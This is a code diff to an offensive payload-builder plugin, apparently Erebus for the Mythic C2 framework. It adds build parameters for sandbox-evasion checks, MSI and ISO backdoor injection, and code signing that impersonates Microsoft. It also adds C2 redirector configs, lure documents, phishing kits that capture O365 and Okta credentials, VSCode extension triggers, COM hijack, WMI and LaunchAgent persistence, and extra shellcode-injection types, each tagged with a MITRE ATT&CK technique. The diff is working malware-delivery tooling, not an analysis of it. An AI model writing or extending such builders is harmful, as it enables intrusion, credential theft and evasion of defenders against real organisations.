@@ -2262,6 +2549,7 @@ generated if none have been entered.""",
         ),
         BuildParameter(
             name = "3.E9f Check Default Bad Hostnames",
+            group_name="16 - Containers",
             parameter_type = BuildParameterType.Boolean,
             description = (
                 "Refuse to stage if the current hostname contains common sandbox "
@@ -2275,6 +2563,7 @@ generated if none have been entered.""",
         ),
         BuildParameter(
             name = "3.E9g Hostname Whitelist",
+            group_name="16 - Containers",
             parameter_type = BuildParameterType.String,
             description = (
                 "Comma-separated list of hostnames (or suffixes) that are ALLOWED "
@@ -2288,6 +2577,7 @@ generated if none have been entered.""",
         ),
         BuildParameter(
             name = "3.E9h Hostname Blocklist",
+            group_name="16 - Containers",
             parameter_type = BuildParameterType.String,
             description = (
                 "Comma-separated list of hostnames that are BLOCKED from running "
@@ -2301,6 +2591,7 @@ generated if none have been entered.""",
         ),
         BuildParameter(
             name = "3.E9i Username Whitelist",
+            group_name="16 - Containers",
             parameter_type = BuildParameterType.String,
             description = "Comma-separated list of allowed usernames. Empty = no whitelist check.",
             default_value = "",
@@ -2311,6 +2602,7 @@ generated if none have been entered.""",
         ),
         BuildParameter(
             name = "3.E9j Username Blocklist",
+            group_name="16 - Containers",
             parameter_type = BuildParameterType.String,
             description = "Comma-separated list of blocked usernames. Empty = no blocklist check.",
             default_value = "",
@@ -2321,6 +2613,7 @@ generated if none have been entered.""",
         ),
         BuildParameter(
             name = "3.E9k Min Screen Width",
+            group_name="16 - Containers",
             parameter_type = BuildParameterType.String,
             description = (
                 "Refuse to stage if the primary display's width is less than this "
@@ -2335,6 +2628,7 @@ generated if none have been entered.""",
         ),
         BuildParameter(
             name = "3.E9l Min Screen Height",
+            group_name="16 - Containers",
             parameter_type = BuildParameterType.String,
             description = "Refuse to stage if the primary display's height is less than this many pixels. 0 disables the check.",
             default_value = "720",
@@ -2345,6 +2639,7 @@ generated if none have been entered.""",
         ),
         BuildParameter(
             name = "3.E9m Min CPU Count",
+            group_name="16 - Containers",
             parameter_type = BuildParameterType.String,
             description = "Refuse to stage if the host has fewer than N logical CPUs (most sandbox VMs use 1-2). 0 disables.",
             default_value = "2",
@@ -2355,6 +2650,7 @@ generated if none have been entered.""",
         ),
         BuildParameter(
             name = "3.E9n Min Memory (MB)",
+            group_name="16 - Containers",
             parameter_type = BuildParameterType.String,
             description = "Refuse to stage if the host has less than N MB of RAM. 0 disables.",
             default_value = "2048",
@@ -2365,6 +2661,7 @@ generated if none have been entered.""",
         ),
         BuildParameter(
             name = "3.E9o Max Idle Seconds",
+            group_name="16 - Containers",
             parameter_type = BuildParameterType.String,
             description = "Refuse to stage if the system idle time is greater than this many seconds (unattended box = suspicious). 0 disables.",
             default_value = "0",
@@ -2375,6 +2672,7 @@ generated if none have been entered.""",
         ),
         BuildParameter(
             name = "3.E9p Pre-Spawn Delay (ms)",
+            group_name="16 - Containers",
             parameter_type = BuildParameterType.String,
             description = (
                 "Sleep this many ms inside the Install handler AFTER every other "
@@ -2390,6 +2688,7 @@ generated if none have been entered.""",
         ),
         BuildParameter(
             name = "3.E9q Guardrail Debug Mode",
+            group_name="16 - Containers",
             parameter_type = BuildParameterType.Boolean,
             description = (
                 "TESTING ONLY. When True, guardrail failures are surfaced visibly: "
@@ -2408,6 +2707,7 @@ generated if none have been entered.""",
 
         BuildParameter(
             name="3.1 Compression Level",
+            group_name="16 - Containers",
             parameter_type=BuildParameterType.ChooseOne,
             description="Select compression level (9 is max).",
             choices=["0", "1", "3", "5", "7", "9"],
@@ -2423,6 +2723,7 @@ generated if none have been entered.""",
 
         BuildParameter(
             name="3.2 Archive Password",
+            group_name="16 - Containers",
             parameter_type=BuildParameterType.String,
             description="Optional password for the archive (leave empty for none).",
             default_value="",
@@ -2440,6 +2741,7 @@ generated if none have been entered.""",
         # Electron persistence parameters
         BuildParameter(
             name = "3.P0 Enable Persistence",
+            group_name="16 - Containers",
             parameter_type = BuildParameterType.Boolean,
             description = (
                 "Copy the loader to a permanent location and register a persistence mechanism "
@@ -2457,6 +2759,7 @@ generated if none have been entered.""",
         ),
         BuildParameter(
             name = "3.P1 Persistence Method",
+            group_name="16 - Containers",
             parameter_type = BuildParameterType.ChooseOne,
             description = (
                 "Persistence mechanism to register after install:\n"
@@ -2474,6 +2777,7 @@ generated if none have been entered.""",
         ),
         BuildParameter(
             name = "3.P2 Persistence Name",
+            group_name="16 - Containers",
             parameter_type = BuildParameterType.String,
             description = (
                 "Registry value name, scheduled task name, and install subdirectory name "
@@ -2488,6 +2792,7 @@ generated if none have been entered.""",
         ),
         BuildParameter(
             name = "3.P3 Persistence Install Dir",
+            group_name="16 - Containers",
             parameter_type = BuildParameterType.ChooseOne,
             description = (
                 "Base directory where the loader is copied before persistence is registered.\n"
@@ -2505,6 +2810,7 @@ generated if none have been entered.""",
         #ISO
         BuildParameter(
             name="4.0 ISO Volume ID",
+            group_name="16 - Containers",
             parameter_type=BuildParameterType.String,
             description="ISO Volume name seen in Explorer.",
             default_value="EREBUS",
@@ -2516,6 +2822,7 @@ generated if none have been entered.""",
 
         BuildParameter(
             name="4.1 ISO enable Autorun",
+            group_name="16 - Containers",
             parameter_type=BuildParameterType.Boolean,
             description="Enable Autorun for ISO",
             default_value=False,
@@ -2527,6 +2834,7 @@ generated if none have been entered.""",
 
         BuildParameter(
             name="4.2 ISO Backdoor File",
+            group_name="16 - Containers",
             parameter_type=BuildParameterType.File,
             description="Backdoor an existing ISO",
             required=False,
@@ -2536,6 +2844,7 @@ generated if none have been entered.""",
         ),
         BuildParameter(
             name="5.0 MSI Product Name",
+            group_name="16 - Containers",
             parameter_type=BuildParameterType.String,
             description="Application name shown in MSI/UI",
             default_value="System Updater",
@@ -2546,6 +2855,7 @@ generated if none have been entered.""",
         ),
         BuildParameter(
             name="5.1 MSI Manufacturer",
+            group_name="16 - Containers",
             parameter_type=BuildParameterType.String,
             description="Company name shown in MSI metadata",
             default_value="Microsoft Corporation",
@@ -2556,6 +2866,7 @@ generated if none have been entered.""",
         ),
         BuildParameter(
             name="5.2 MSI Install Scope",
+            group_name="16 - Containers",
             parameter_type=BuildParameterType.ChooseOne,
             description="Machine=Admin Required (Program Files), User=No Admin (AppData)",
             choices=["User", "Machine"],
@@ -2567,6 +2878,7 @@ generated if none have been entered.""",
 
         BuildParameter(
             name="5.3 Enable MSI Backdoor",
+            group_name="16 - Containers",
             parameter_type=BuildParameterType.Boolean,
             description="Enable backdoor functionality for MSI installer",
             default_value=False,
@@ -2577,6 +2889,7 @@ generated if none have been entered.""",
         ),
         BuildParameter(
             name="5.4 MSI Backdoor File",
+            group_name="16 - Containers",
             parameter_type=BuildParameterType.File,
             description="Backdoor an existing MSI installer by injecting payload execution",
             required=False,
@@ -2587,6 +2900,7 @@ generated if none have been entered.""",
         ),
         BuildParameter(
             name="5.5 MSI Attack Type",
+            group_name="16 - Containers",
             parameter_type=BuildParameterType.ChooseOne,
             description="""Attack vector for MSI backdoor injection:
 - execute: Run command via CustomAction (stealthiest)
@@ -2604,6 +2918,7 @@ generated if none have been entered.""",
         ),
         BuildParameter(
             name="5.6 MSI Entry Point",
+            group_name="16 - Containers",
             parameter_type=BuildParameterType.String,
             description="DLL export function or script function name (required for load-dll/dotnet/script attacks)",
             default_value="",
@@ -2618,6 +2933,7 @@ generated if none have been entered.""",
         ),
         BuildParameter(
             name="5.7 MSI Command Arguments",
+            group_name="16 - Containers",
             parameter_type=BuildParameterType.String,
             description="Command line arguments for execute/run-exe attacks",
             default_value="",
@@ -2632,6 +2948,7 @@ generated if none have been entered.""",
         ),
         BuildParameter(
             name="5.8 MSI Execution Condition",
+            group_name="16 - Containers",
             parameter_type=BuildParameterType.String,
             description="MSI condition for payload execution (default: NOT REMOVE = run on install only)",
             default_value="NOT REMOVE",
@@ -2644,6 +2961,7 @@ generated if none have been entered.""",
         ),
         BuildParameter(
             name="5.9 MSI Custom Action Name",
+            group_name="16 - Containers",
             parameter_type=BuildParameterType.String,
             description="Custom action name (leave empty for random generation)",
             default_value="",
@@ -2657,6 +2975,7 @@ generated if none have been entered.""",
         #Codesigning
         BuildParameter(
             name="6.0 Codesign Loader",
+            group_name="17 - Codesigning",
             parameter_type=BuildParameterType.Boolean,
             description="Sign the loader with a code signing cert",
             required=False,
@@ -2667,6 +2986,7 @@ generated if none have been entered.""",
 
         BuildParameter(
             name="6.1 Codesign Type",
+            group_name="17 - Codesigning",
             parameter_type=BuildParameterType.ChooseOne,
             description="Choose how you want to sign the payload",
             choices=["SelfSign", "Spoof URL", "Provide Certificate"],
@@ -2678,6 +2998,7 @@ generated if none have been entered.""",
 
         BuildParameter(
             name="6.2 Codesign CN",
+            group_name="17 - Codesigning",
             parameter_type=BuildParameterType.String,
             default_value="Microsoft Corporation",
             description="Common Name (CN) for self-signed cert",
@@ -2689,6 +3010,7 @@ generated if none have been entered.""",
 
         BuildParameter(
             name="6.3 Codesign Orgname",
+            group_name="17 - Codesigning",
             parameter_type=BuildParameterType.String,
             default_value="Microsoft Corporation",
             description="Organisation Name for self-signed cert",
@@ -2700,6 +3022,7 @@ generated if none have been entered.""",
 
         BuildParameter(
             name="6.4 Codesign Spoof URL",
+            group_name="17 - Codesigning",
             parameter_type=BuildParameterType.String,
             default_value="www.google.com",
             description="URL to clone certificate details from",
@@ -2711,6 +3034,7 @@ generated if none have been entered.""",
 
         BuildParameter(
             name="6.5 Codesign Cert",
+            group_name="17 - Codesigning",
             parameter_type=BuildParameterType.File,
             description="Upload PFX/P12 certificate",
             hide_conditions=[
@@ -2720,6 +3044,7 @@ generated if none have been entered.""",
         ),
         BuildParameter(
             name="6.6 Codesign Cert Password",
+            group_name="17 - Codesigning",
             parameter_type=BuildParameterType.String,
             default_value="",
             description="Certificate password (leave empty if none)",
@@ -2732,6 +3057,7 @@ generated if none have been entered.""",
         # ── Redirector Config Generator ───────────────────────────────────────
         BuildParameter(
             name="7.0 Generate Redirector Configs",
+            group_name="18 - Redirector",
             parameter_type=BuildParameterType.Boolean,
             description=(
                 "Generate C2 redirector configs (Apache .htaccess, Nginx block, Caddyfile, Terraform stub) "
@@ -2743,6 +3069,7 @@ generated if none have been entered.""",
 
         BuildParameter(
             name="7.1 Redirector Team Server URL",
+            group_name="18 - Redirector",
             parameter_type=BuildParameterType.String,
             description="Full URL of the hidden team server (e.g. https://10.0.0.5:8443). Never exposed to the public.",
             default_value="https://10.0.0.5:8443",
@@ -2754,6 +3081,7 @@ generated if none have been entered.""",
 
         BuildParameter(
             name="7.2 Redirector Public Domain",
+            group_name="18 - Redirector",
             parameter_type=BuildParameterType.String,
             description="Public hostname of the redirector (e.g. cdn.legitimate-looking.com). Used in Nginx/Caddy configs.",
             default_value="cdn.example.com",
@@ -2765,6 +3093,7 @@ generated if none have been entered.""",
 
         BuildParameter(
             name="7.3 Redirector Decoy URL",
+            group_name="18 - Redirector",
             parameter_type=BuildParameterType.String,
             description="Catch-all 302 target for non-matching traffic. Pick a plausible site matching the redirector domain theme.",
             default_value="https://www.microsoft.com/en-us/",
@@ -2777,6 +3106,7 @@ generated if none have been entered.""",
         # ── Decoy Document Generator ──────────────────────────────────────────
         BuildParameter(
             name="8.0 Generate Decoy Document",
+            group_name="13 - Decoy",
             parameter_type=BuildParameterType.Boolean,
             description=(
                 "Generate a lure document (DOCX/XLSX) placed alongside the payload. "
@@ -2788,6 +3118,7 @@ generated if none have been entered.""",
 
         BuildParameter(
             name="8.1 Decoy Template",
+            group_name="13 - Decoy",
             parameter_type=BuildParameterType.ChooseOne,
             description="Lure document theme: invoice, hr_policy, job_offer, it_notice, nda",
             choices=["invoice", "hr_policy", "job_offer", "it_notice", "nda"],
@@ -2800,6 +3131,7 @@ generated if none have been entered.""",
 
         BuildParameter(
             name="8.2 Decoy Company Name",
+            group_name="13 - Decoy",
             parameter_type=BuildParameterType.String,
             description="Company name shown in the decoy document header / letterhead.",
             default_value="Acme Corporation",
@@ -2811,6 +3143,7 @@ generated if none have been entered.""",
 
         BuildParameter(
             name="8.3 Decoy Recipient",
+            group_name="13 - Decoy",
             parameter_type=BuildParameterType.String,
             description="Addressee name used in salutations and 'Bill To' fields.",
             default_value="Valued Employee",
@@ -2822,6 +3155,7 @@ generated if none have been entered.""",
 
         BuildParameter(
             name="8.4 Decoy Format",
+            group_name="13 - Decoy",
             parameter_type=BuildParameterType.ChooseOne,
             description="Output format for the decoy document (xlsx only available for invoice template).",
             choices=["docx", "xlsx"],
@@ -2835,6 +3169,7 @@ generated if none have been entered.""",
         # ── Phishing Page Generator ───────────────────────────────────────────
         BuildParameter(
             name="9.0 Generate Phishing Page",
+            group_name="11 - Triggers",
             parameter_type=BuildParameterType.Boolean,
             description=(
                 "Generate a phishing page kit (HTML + PHP/Python capture backend) "
@@ -2846,6 +3181,7 @@ generated if none have been entered.""",
 
         BuildParameter(
             name="9.1 Phishing Template",
+            group_name="11 - Triggers",
             parameter_type=BuildParameterType.ChooseOne,
             description="Portal to spoof: o365, sharepoint, docusign, adfs, okta",
             choices=["o365", "sharepoint", "docusign", "adfs", "okta"],
@@ -2858,6 +3194,7 @@ generated if none have been entered.""",
 
         BuildParameter(
             name="9.2 Phishing Org Name",
+            group_name="11 - Triggers",
             parameter_type=BuildParameterType.String,
             description="Organization name shown in the phishing page header.",
             default_value="Acme Corporation",
@@ -2869,6 +3206,7 @@ generated if none have been entered.""",
 
         BuildParameter(
             name="9.3 Phishing Domain",
+            group_name="11 - Triggers",
             parameter_type=BuildParameterType.String,
             description="Email domain shown as placeholder in login forms (e.g. acme.com).",
             default_value="acme.com",
@@ -2880,6 +3218,7 @@ generated if none have been entered.""",
 
         BuildParameter(
             name="9.4 Phishing Redirect URL",
+            group_name="11 - Triggers",
             parameter_type=BuildParameterType.String,
             description="URL to redirect victim to after credential capture (e.g. the real O365 portal).",
             default_value="https://www.office.com",
@@ -2891,12 +3230,61 @@ generated if none have been entered.""",
 
         BuildParameter(
             name="9.5 GoPhish Webhook",
+            group_name="11 - Triggers",
             parameter_type=BuildParameterType.String,
             description="Optional GoPhish campaign webhook URL. Captured credentials are also POSTed here.",
             default_value="",
             required=False,
             hide_conditions=[
                 HideCondition(name="9.0 Generate Phishing Page", operand=HideConditionOperand.EQ, value=False),
+            ]
+        ),
+
+        # ── Standalone Persistence ──────────────────────────────────────────────
+        BuildParameter(
+            name="10.0 Standalone Persistence",
+            group_name="12 - Persistence",
+            parameter_type=BuildParameterType.Boolean,
+            description=(
+                "Generate standalone persistence artifacts alongside the payload.\n"
+                "COM Hijacking (Windows, T1546.015): HKCU CLSID override .reg + optional PS1 installer.\n"
+                "WMI Subscription (Windows, T1546.003): PS1 installer + .mof for mofcomp.exe deployment.\n"
+                "LaunchAgent (macOS, T1543.001): XML plist + install/uninstall shell scripts."
+            ),
+            default_value=False,
+            required=False,
+        ),
+        BuildParameter(
+            name="10.1 Persistence Method",
+            group_name="12 - Persistence",
+            parameter_type=BuildParameterType.ChooseOne,
+            choices=["COM Hijack", "WMI Subscription", "LaunchAgent"],
+            description=(
+                "Standalone persistence technique to generate artifacts for.\n"
+                "COM Hijack (T1546.015): HKCU CLSID override fires when the COM object is next instantiated.\n"
+                "WMI Subscription (T1546.003): permanent WMI event consumer fires every 30 minutes.\n"
+                "LaunchAgent (T1543.001): macOS user-scope LaunchAgent fires at login and stays resident."
+            ),
+            default_value="COM Hijack",
+            required=False,
+            hide_conditions=[
+                HideCondition(name="10.0 Standalone Persistence", operand=HideConditionOperand.EQ, value=False),
+            ]
+        ),
+        BuildParameter(
+            name="10.2 Persistence Target Binary",
+            group_name="12 - Persistence",
+            parameter_type=BuildParameterType.String,
+            description=(
+                "Full path to the loader binary that the persistence mechanism executes.\n"
+                "COM Hijack / WMI: Windows path (e.g. C:\\ProgramData\\Update\\loader.exe).\n"
+                "LaunchAgent: macOS path (e.g. /Users/user/Library/Application Support/loader).\n"
+                "Leave empty to use the plugin default placeholder."
+            ),
+            default_value="",
+            required=False,
+            hide_conditions=[
+                HideCondition(name="10.0 Standalone Persistence", operand=HideConditionOperand.EQ, value=False),
             ]
         ),
 
@@ -2953,6 +3341,9 @@ generated if none have been entered.""",
 
         BuildStep(step_name = "[T1566.002] - Phishing Kit",
                   step_description = "Generating phishing page kit with credential capture backend"),
+
+        BuildStep(step_name = "[T1546] - Standalone Persistence",
+                  step_description = "Generating standalone persistence artifacts (COM Hijack / WMI / LaunchAgent)"),
     ]
 
     def calculate_sha256(self, file_path: str) -> str:
@@ -3156,6 +3547,15 @@ generated if none have been entered.""",
             ("2.0 Trigger Type", "MSI",        [("T1218.007", "Msiexec")]),
             ("2.0 Trigger Type", "LNK",        [("T1204.002", "User Execution: Malicious File")]),
             ("2.0 Trigger Type", "MSC",        [("T1218.014", "MMC")]),
+            ("2.0 Trigger Type", "VSCode",     [("T1204.002", "User Execution: Malicious File"),
+                                                ("T1059.007", "JavaScript"),
+                                                ("T1546",     "Event Triggered Execution")]),
+            ("2.0 Trigger Type", "OneNote",   [("T1566.001", "Spearphishing Attachment"),
+                                                ("T1204.002", "User Execution: Malicious File")]),
+            ("0.9 Trigger Type", "CMSTP",     [("T1218.003", "System Binary Proxy Execution: CMSTP")]),
+            ("0.9 Trigger Type", "Regsvr32",  [("T1218.010", "System Binary Proxy Execution: Regsvr32")]),
+            ("0.9 Trigger Type", "XSL",       [("T1220",     "XSL Script Processing")]),
+            ("0.9 Trigger Type", "InstallUtil",[("T1218.004", "System Binary Proxy Execution: InstallUtil")]),
             # Container
             ("3.0 Container Type", "ISO",      [("T1553.005", "Mark-of-the-Web Bypass")]),
             ("3.0 Container Type", "VHD",      [("T1553.005", "Mark-of-the-Web Bypass")]),
@@ -3170,6 +3570,9 @@ generated if none have been entered.""",
             ("0.4 Shellcode Loader - Injection Type", "6", [("T1055.013", "Process Doppelgänging / Module Stomping")]),
             ("0.4 Shellcode Loader - Injection Type", "7", [("T1055",     "KernelCallbackTable Hijack")]),
             ("0.4 Shellcode Loader - Injection Type", "8", [("T1055.012", "Process Hollowing (TxF)")]),
+            ("0.4 Shellcode Loader - Injection Type", "9", [("T1055.015", "ListPlanting / Thread Pool Injection (JobApc)")]),
+            ("0.4 Shellcode Loader - Injection Type", "10", [("T1055.012", "Process Hollowing")]),
+            ("0.4 Shellcode Loader - Injection Type", "11", [("T1055",     "Process Injection: Function Stomping")]),
             # Obfuscation
             ("0.0c Enable Donut", True,        [("T1027.009", "Embedded Payloads (Donut PE→shellcode)")]),
             # Evasion
@@ -3178,6 +3581,10 @@ generated if none have been entered.""",
             ("6.0 Codesign Loader", True,      [("T1553.002", "Code Signing")]),
             # Infra
             ("7.0 Generate Redirector Configs", True, [("T1090.002", "External Proxy / Redirector")]),
+            # Standalone Persistence
+            ("10.1 Persistence Method", "COM Hijack",       [("T1546.015", "Event Triggered Execution: COM Hijacking")]),
+            ("10.1 Persistence Method", "WMI Subscription", [("T1546.003", "Event Triggered Execution: WMI Event Subscription")]),
+            ("10.1 Persistence Method", "LaunchAgent",      [("T1543.001", "Create or Modify System Process: Launch Agent")]),
             # Maldoc
             ("0.9 Create MalDoc", "Excel (XLSM)",  [("T1566.001", "Spearphishing Attachment"), ("T1137.001", "Office Template Macros")]),
             ("0.9 Create MalDoc", "VBA",            [("T1566.001", "Spearphishing Attachment"), ("T1137.001", "Office Template Macros")]),
@@ -3455,6 +3862,10 @@ generated if none have been entered.""",
                 url="https://login.microsoftonline.com/",
                 output_filename="verify.html",
                 payload_dir=w / "payload")),
+            ("VSCode", lambda w: create_vscode_ext_trigger(
+                shellcode_path=pathlib.Path(mythic_shellcode_path),
+                payload_dir=w / "payload",
+                decoy_file=decoy_file)),
             ("AppDomain", lambda w: create_appdomain_config(
                 target_exe="AddInProcess.exe",
                 output_dir=w / "payload")),
@@ -3487,10 +3898,11 @@ generated if none have been entered.""",
         with zipfile.ZipFile(master_buf, "w", zipfile.ZIP_DEFLATED) as mz:
 
             # ── Trigger variants ──────────────────────────────────────────────
+            _loop = asyncio.get_running_loop()
             for tag, tfn in trigger_specs:
                 work = _fresh_build(tag)
                 try:
-                    tfn(work)
+                    await _loop.run_in_executor(None, tfn, work)
                     data = _zip_dir(work / "payload")
                     mz.writestr(f"triggers/{tag}/payload_{tag.lower()}.zip", data)
                     manifest_lines.append(f"  triggers/{tag}/payload_{tag.lower()}.zip  - OK")
@@ -3511,7 +3923,7 @@ generated if none have been entered.""",
                     create_bat_payload_trigger(
                         target_bin=_cmd_bin, args=_cmd_args,
                         payload_dir=work / "payload", decoy_file=decoy_file)
-                    out_path = cfn(work)
+                    out_path = await _loop.run_in_executor(None, cfn, work)
                     if out_path and Path(out_path).exists():
                         suffix = Path(out_path).suffix
                         arc_name = f"containers/{tag}/payload_{tag.lower()}{suffix}"
@@ -3606,7 +4018,9 @@ generated if none have been entered.""",
         inner_path = await self._build_inner_container(agent_build_path)
         outer = (self.get_parameter("3.0T Outer Transport") or "None").strip()
         if inner_path and outer != "None":
-            inner_path = self._wrap_in_outer_transport(inner_path, outer)
+            inner_path = await asyncio.get_running_loop().run_in_executor(
+                None, self._wrap_in_outer_transport, inner_path, outer
+            )
         return inner_path
 
     async def _build_inner_container(self, agent_build_path):
@@ -3627,7 +4041,8 @@ generated if none have been entered.""",
                 }
                 target_ext = _ext_map.get(_fmt, ".xlsm")
         else:
-            target_ext = f".{self.get_parameter('0.9 Trigger Type').lower()}"
+            _raw_trigger_ext = self.get_parameter('0.9 Trigger Type').lower()
+            target_ext = ".vsix" if _raw_trigger_ext == "vscode" else f".{_raw_trigger_ext}"
 
 
         match(self.get_parameter("3.0 Container Type")):
@@ -3676,8 +4091,8 @@ generated if none have been entered.""",
                 )
 
             case "Electron":
-                # Optional pre-built payload zip: extract erebus.{exe,dll,xll}
-                # into payload/ before containerisation, replacing compiled output.
+                # Optional pre-built payload zip: extract all contents into
+                # payload/ before containerisation, replacing compiled output.
                 payload_zip_uuid = self.get_parameter("3.E6b Electron Payload Zip")
                 if payload_zip_uuid:
                     zip_resp = await SendMythicRPCFileGetContent(
@@ -3687,18 +4102,20 @@ generated if none have been entered.""",
                         raise RuntimeError("Failed to retrieve 3.E6b Electron Payload Zip from Mythic.")
                     _payload_dir = Path(agent_build_path) / "payload"
                     _payload_dir.mkdir(parents=True, exist_ok=True)
-                    allowed = {"erebus.exe", "erebus.dll", "erebus.xll"}
                     with zipfile.ZipFile(io.BytesIO(zip_resp.Content)) as zf:
                         extracted = []
                         for member in zf.namelist():
-                            basename = Path(member).name
-                            if basename in allowed:
-                                (_payload_dir / basename).write_bytes(zf.read(member))
-                                extracted.append(basename)
+                            # Skip directory entries and guard against zip-slip
+                            if member.endswith("/"):
+                                continue
+                            member_path = (_payload_dir / member).resolve()
+                            if not str(member_path).startswith(str(_payload_dir.resolve())):
+                                continue
+                            member_path.parent.mkdir(parents=True, exist_ok=True)
+                            member_path.write_bytes(zf.read(member))
+                            extracted.append(member)
                     if not extracted:
-                        raise RuntimeError(
-                            "3.E6b Electron Payload Zip contained no erebus.{exe,dll,xll}."
-                        )
+                        raise RuntimeError("3.E6b Electron Payload Zip was empty or contained no files.")
 
                 # Optional operator-supplied icon (PNG). Fetched from Mythic
                 # by file UUID when set; falls back to the vendored Erebus.png.
@@ -3984,17 +4401,20 @@ generated if none have been entered.""",
             encryption_type_value = encryption_type_map.get(self.get_parameter("2.1 Encryption Type"), 0)
             encryption_key_bytes = "0x00"
             encryption_iv_bytes = ", ".join(["0x00"] * 16)
+            mz_pe_mode = False
             if not donut_enabled:
                 with open(str(mythic_shellcode_path), "rb") as f:
                     header = f.read(2)
                     if header == b"\x4d\x5a":
-                        await self._fail_step(response, "[T1027] - Header Check",
-                            "Supplied payload is a PE instead of raw shellcode.",
-                            "Found leading MZ header - supplied file was not shellcode")
-                        return response
-                response.status = BuildStatus.Success
-                response.build_message = "No leading MZ header found in payload."
-                await self._build_step("[T1027] - Header Check", "No leading MZ header found in payload", success=True)
+                        mz_pe_mode = True
+                        shutil.copy(src=str(mythic_shellcode_path), dst=str(obfuscated_shellcode_path))
+                        await self._build_step("[T1027] - Header Check",
+                            "MZ header detected - PE will be used directly, skipping obfuscation and loader compilation",
+                            success=True)
+                    else:
+                        response.status = BuildStatus.Success
+                        response.build_message = "No leading MZ header found in payload."
+                        await self._build_step("[T1027] - Header Check", "No leading MZ header found in payload", success=True)
 
             # R2a: command construction lives in plugin_shellcode_obfuscation
             # (pure function in archive/shellcode_obfuscation.py). The async
@@ -4016,42 +4436,46 @@ generated if none have been entered.""",
                 encryption_key=_key,
             )
 
-            process = await asyncio.create_subprocess_exec(
-                *cmd,
-                stdout=asyncio.subprocess.PIPE,
-                stderr=asyncio.subprocess.PIPE,
-            )
-            stdout, stderr = await process.communicate()
+            if not mz_pe_mode:
+                process = await asyncio.create_subprocess_exec(
+                    *cmd,
+                    stdout=asyncio.subprocess.PIPE,
+                    stderr=asyncio.subprocess.PIPE,
+                )
+                stdout, stderr = await process.communicate()
 
-            if stdout:
-                output += f"[stdout]\n{stdout.decode()}"
-            if stderr:
-                output += f"[stderr]\n{stderr.decode()}"
+                if stdout:
+                    output += f"[stdout]\n{stdout.decode()}"
+                if stderr:
+                    output += f"[stderr]\n{stderr.decode()}"
 
             if os.path.exists(obfuscated_shellcode_path):
-                # Re-run shellcrypt in C format so we can parse the key/IV
-                # bytes out of its stdout and thread them into config.hpp.
-                # Command construction + regex parsing live in the
-                # shellcode_obfuscation plugin.
+                # Parse key/IV directly out of the C source shellcrypt
+                # just wrote in the first invocation above. The previous
+                # implementation re-ran shellcrypt to "extract" the key,
+                # but when the operator picks Encryption Key = "NONE"
+                # shellcrypt autogenerates a fresh random key per run -
+                # so the extracted key came from a SECOND keystream that
+                # didn't match the encrypted shellcode written on the
+                # first run. RC4/AES then decrypted to garbage at
+                # runtime and the loader never executed shellcode.
+                #
+                # ClickOnce uses -f csharp on call 1 so its file isn't
+                # parseable by the C-format regex; for that path we fall
+                # back to the existing CSharp key parser below (which
+                # reads the same call-1 file).
                 try:
-                    _comp2 = self.get_parameter("2.0 Compression Type")
-                    _enc2 = self.get_parameter("2.3 Encoding Type")
-                    key_cmd = build_key_extraction_cmd(
-                        shellcrypt_path,
-                        mythic_shellcode_path,
-                        encryption_method=ENCRYPTION_METHODS[self.get_parameter("2.1 Encryption Type")],
-                        compression_method=(COMPRESSION_METHODS[_comp2] if _comp2 and _comp2 != "NONE" else None),
-                        encoding_method=(ENCODING_METHODS[_enc2] if _enc2 and _enc2 != "NONE" else None),
-                        encryption_key=self.get_parameter("2.2 Encryption Key"),
-                    )
-                    shellcode_src = subprocess.check_output(key_cmd, text=True)
-                    _key_parsed, _iv_parsed = parse_key_iv(shellcode_src)
-                    if _key_parsed is not None:
-                        encryption_key_bytes = _key_parsed
-                    if _iv_parsed is not None:
-                        encryption_iv_bytes = _iv_parsed
+                    _ldr = self.get_parameter("0.1 Loader Type")
+                    if _ldr != "ClickOnce":
+                        with open(obfuscated_shellcode_path, "r", encoding="utf-8", errors="replace") as _f:
+                            shellcode_src = _f.read()
+                        _key_parsed, _iv_parsed = parse_key_iv(shellcode_src)
+                        if _key_parsed is not None:
+                            encryption_key_bytes = _key_parsed
+                        if _iv_parsed is not None:
+                            encryption_iv_bytes = _iv_parsed
                 except Exception as e:
-                    output += f"[WARN] Failed to parse shellcrypt key/IV: {str(e)}\n"
+                    output += f"[WARN] Failed to parse shellcrypt key/IV from {obfuscated_shellcode_path}: {str(e)}\n"
 
                 # Copy the obfuscated shellcode file over to the shellcode.hpp file
                 if self.get_parameter("0.1 Loader Type") == "Shellcode Loader":
@@ -4106,7 +4530,7 @@ generated if none have been entered.""",
                         )
                     output += f"[DEBUG] Wrote {len(_raw)} raw bytes to {mac_shellcode_h}\n"
 
-                if self.get_parameter("2.4 Shellcode Format") == "Raw":
+                if not mz_pe_mode and self.get_parameter("2.4 Shellcode Format") == "Raw":
                     # Raw format: re-run shellcrypt in C mode and slice the
                     # `unsigned char key[] = {...};` declaration out of
                     # stdout so the loader can compile it in directly.
@@ -4116,7 +4540,15 @@ generated if none have been entered.""",
                         encryption_method=ENCRYPTION_METHODS[self.get_parameter("2.1 Encryption Type")],
                         encryption_key=self.get_parameter("2.2 Encryption Key"),
                     )
-                    shellcode_src = subprocess.check_output(cmd, text=True)
+                    _proc = await asyncio.create_subprocess_exec(
+                        *cmd,
+                        stdout=asyncio.subprocess.PIPE,
+                        stderr=asyncio.subprocess.PIPE,
+                    )
+                    _out, _err = await _proc.communicate()
+                    if _proc.returncode != 0:
+                        raise subprocess.CalledProcessError(_proc.returncode, cmd, _out, _err)
+                    shellcode_src = _out.decode()
                     output += shellcode_src
                     key_array = extract_raw_key_array(shellcode_src)
                     output += key_array
@@ -4133,14 +4565,14 @@ generated if none have been entered.""",
                     response.build_message = "Shellcode Generated!"
                     await self._build_step("[T1027] - Shellcode Obfuscation", "Obfuscated Shellcode - Continuing to Next Step", success=True)
 
-            elif process.returncode != 0:
+            elif not mz_pe_mode and process.returncode != 0:
                 response.payload = b""
                 await self._build_step("[T1027] - Shellcode Obfuscation", "Failed to obfuscate shellcode", success=False)
                 response.build_message = "Failed to obfuscate shellcode."
                 response.build_stderr = output + "\n" + obfuscated_shellcode_path
                 return response
 
-            else:
+            elif not mz_pe_mode:
                 response.payload = b""
                 response.status = BuildStatus.Error
                 await self._build_step("[T1027] - Shellcode Obfuscation", "Failed to obfuscate shellcode", success=False)
@@ -4288,19 +4720,19 @@ generated if none have been entered.""",
                             guardrails_check_sandbox=guardrails_check_sandbox,
                             guardrails_decoy_file="decoy.pdf" if self.get_parameter("0.13 Decoy File Inclusion") else "",
                             gr_block=gr_block,
-                            syscall_backend=(1 if self.get_parameter("0.5m Syscall Backend") == "SysWhispers3" else 0),
